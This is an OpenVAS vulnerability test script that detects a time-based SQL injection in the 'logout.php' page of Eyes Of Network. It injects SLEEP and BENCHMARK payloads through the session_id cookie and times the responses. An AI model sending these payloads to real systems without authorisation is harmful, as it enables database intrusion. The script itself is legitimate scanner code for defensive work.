###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eyesofnetwork_logout_sqli.nasl 6800 2017-07-26 06:58:22Z cfischer $
#
# Eyes Of Network (EON) 'logout.php' SQL Injection Vulnerability
#
# Authors:
# Christian Fischer <christian.fischer@greenbone.net>
#
# Copyright:
# Copyright (c) 2017 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:eyes_of_network:eyes_of_network";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.108174");
  script_version("$Revision: 6800 $");
  script_cve_id("CVE-2017-1000060");
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2017-07-26 08:58:22 +0200 (Wed, 26 Jul 2017) $");
  script_tag(name:"creation_date", value:"2017-06-07 09:31:19 +0200 (Wed, 07 Jun 2017)");
  script_name("Eyes Of Network (EON) 'logout.php' SQL Injection Vulnerability");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (c) 2017 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("gb_eyesofnetwork_detect.nasl");
  script_require_ports("Services/www", 80);
  script_mandatory_keys("eyesofnetwork/http/detected");

  script_xref(name:"URL", value:"https://www.exploit-db.com/exploits/41774/");
  script_xref(name:"URL", value:"https://rioru.github.io/pentest/web/2017/03/28/from-unauthenticated-to-root-supervision.html");

  script_tag(name:"summary", value:"This host is installed with Eyes Of Network (EON)
  and is prone to a sql injection vulnerability.");

  script_tag(name:"vuldetect", value:"Send a crafted request via HTTP GET and
  check the response time. If the time based check fails also check the version.");

  script_tag(name:"insight", value:"The vulnerability is a time-based SQL injection that can be
  exploited by un-authenticated users via an HTTP GET request and affects the logout.php
  and the cookie parameter 'session_id'.");

  script_tag(name:"impact", value:"Successful exploitation will allow remote
  attackers to e.g dump database data out to a malicious server, using an
  out-of-band technique, such as select_loadfile().

  Impact Level: System/Application");

  script_tag(name:"affected", value:"Eyes Of Network (EON) versions 5.1 and below are vulnerable.");

  script_tag(name:"solution", value:"No Solution or patch is available as of 7th June, 2017. Information
  regarding this issue will be updated once the solution details are available.");

  script_tag(name:"solution_type", value:"NoneAvailable");
  script_tag(name:"qod_type", value:"remote_app");

  exit(0);
}

include("host_details.inc");
include("http_func.inc");
include("http_keepalive.inc");
include("version_func.inc");

if( ! port = get_app_port( cpe:CPE, service:"www" ) ) exit( 0 );
if( ! infos = get_app_version_and_location( cpe:CPE, port:port, exit_no_version:FALSE ) ) exit( 0 );
ver = infos['version'];
dir = infos['location'];

if( dir == "/" ) dir = "";

url = dir + "/logout.php";

# Chose sleep method, from my tests this is required by different versions of the application
if( version_is_greater_equal( version:ver, test_version:"5.1" ) ) {
  cookie1 = "session_id=openvas' OR BENCHMARK(";
  cookie2 = "00000000,1)=1 -- -";
  latency += 1;
} else {
  cookie1 = "session_id=openvas' OR SLEEP(";
  cookie2 = ")=1 -- -";
}

cookie = cookie1 + 0 + cookie2;

# Latency check
req = http_get_req( url:url, port:port, accept_header:"text/html, text/xml", add_headers:make_array( "Cookie", cookie ) );
start = unixtime();
http_keepalive_send_recv( port:port, data:req );
stop = unixtime();
latency = stop - start;
count = 0;

foreach sleep( make_list( 1, 3, 5 ) ) {

  cookie = cookie1 + sleep + cookie2;

  req = http_get_req( url:url, port:port, accept_header:"text/html, text/xml", add_headers:make_array( "Cookie", cookie ) );
  start = unixtime();
  res = http_keepalive_send_recv( port:port, data:req );
  stop = unixtime();
  if( stop - start < sleep || stop - start > ( sleep + 10 + latency ) ) {
    continue;
  } else {
    count += 1;
  }
}

if( count >= 2 ) {
  report = report_vuln_url( port:port, url:url ) + ", Cookie used: " + cookie;
  security_message( port:port, data:report );
  exit( 0 );
# Time-based SQLi is currently not that reliable so also report version-based
} else if( version_is_less_equal( version:ver, test_version:"5.1" ) ) {
  report = report_fixed_ver( installed_version:ver, fixed_version:"NoneAvailable" );
  security_message( port:port, data:report );
  exit( 0 );
}

exit( 99 );